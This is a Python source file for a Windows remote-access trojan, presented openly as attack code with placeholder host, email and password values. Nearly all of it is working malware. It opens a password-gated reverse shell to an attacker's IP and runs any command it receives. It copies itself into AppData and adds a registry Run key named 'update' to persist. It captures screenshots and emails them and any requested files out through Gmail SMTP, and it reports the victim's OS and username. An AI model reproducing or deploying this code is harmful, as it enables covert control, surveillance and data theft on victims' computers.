#!/usr/bin/env python
# -*- coding: utf-8 -

import subprocess
import socket
import platform
import os, sys, shutil
import getpass, time
import smtplib
import pyautogui
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def send_email_attachment(body, filename):
    email_user = 'your_email@gmail.com'
    email_send = 'your_email@gmail.com'
    subject = 'Report!'
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(filename, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= " + filename)
    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email_user, 'YOUR_EMAIL_PASSWORD')
    server.sendmail(email_user, email_send, text)
    server.quit()  

def send_mail(host, port):
    txt = "\n" + str(host) + " ' IP'sine " + str(port) + "There is a connection coming from the port and the connection will be attempted again within 30 seconds..\n\n\n" + " OS: " + str(platform.platform()) + " Platform : " + str(platform.machine()) + " User: " + str(getpass.getuser())
    mail = smtplib.SMTP('smtp.gmail.com', 587)
    mail.ehlo()
    mail.starttls()
    mail.login('your_email@gmail.com', 'YOUR_EMAIL_PASSWORD')
    mail.sendmail('your_email@gmail.com', 'your_email@gmail.com', txt)  # Function For Sending Alert Message With Mail

def persistent():
    evil_file_location = os.environ["appdata"] + "\\NAMEOFTHEFILE.exe" #THE NAME OF THE EXECUTABLE
    if not os.path.exists(evil_file_location):
        shutil.copyfile(sys.executable, evil_file_location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)  # Function For Being Persisting On Victim Computer

def screenshot():
    pic = pyautogui.screenshot()
    s.send("\n\033[42m ------ [+] Screenshot() Command Executed Succesfuly------ \033[0m\n")
    pic.save('screenshot.png')
    s.send("\n [+] screenshot.png Saved Succesfuly\n")
    send_email_attachment("SCREESNSHOTS!", "screenshot.png")
    s.send("\n \033[42m [+] Email Sended Succesfuly \033[0m \n")  # Function For Taking Screenshot

def shell(s, host, port, passwd):
    s.send("[!] Login: ")
    pwd = s.recv(1024)

    if pwd.strip() != passwd:
        s.send("\033[31m Wrong Password !! \033[0m \n")
        shell(s, host, port, passwd)

    else:
        s.send("[+] Connected !")
        while True:
            data = s.recv(1024)

            if data.strip() == "QQQ()":
                s.send("[+] Quitting\n")
                break

            if "download" in data.strip():
                s.send("\n ------ [+] Download() Command Executed Succesfuly------ \n ")
                ddata = data.strip().split(' ')
                str_ddata = ''.join(ddata[1])
                send_email_attachment("Download File!", str_ddata)
                s.send("\n \033[42m [+] Email Sended With File Succesfuly \033[0m \n")

            if data.strip() == "--help":
                help()

            if "cd" in data.strip():
                DATA = data.strip().split(' ')
                os.chdir(DATA[1])

            if data.strip() == "screenshot()":
                screenshot()

            whoami = getpass.getuser()
            path = os.getcwd()
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            s.send(output)
            s.send("\033[31m" + str(whoami) + "\033[0m" + ":" + str(path) + " >> ")  # Function of Main Shell Part

def help():
    help = """
    <###OPTIONS###>
    __________________________________________________________________

    [+] !) screenshot() > For taking screenshot.
    [+] !) download xxxxxx > For downloading xxxxxx file with mail
    __________________________________________________________________

    """
    s.send(help)  # Function For Getting Help

def main(host, port, passwd):
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        persistent()
    except:
        pass

    try:
        s.connect((host, port))
        shell(s, host, port, passwd)
    except socket.error:
        time.sleep(30)
        main(host, port, passwd)

if __name__ == "__main__":
    main("YOUR_HOST_IP", 5000, "YOUR_PASSWORD")

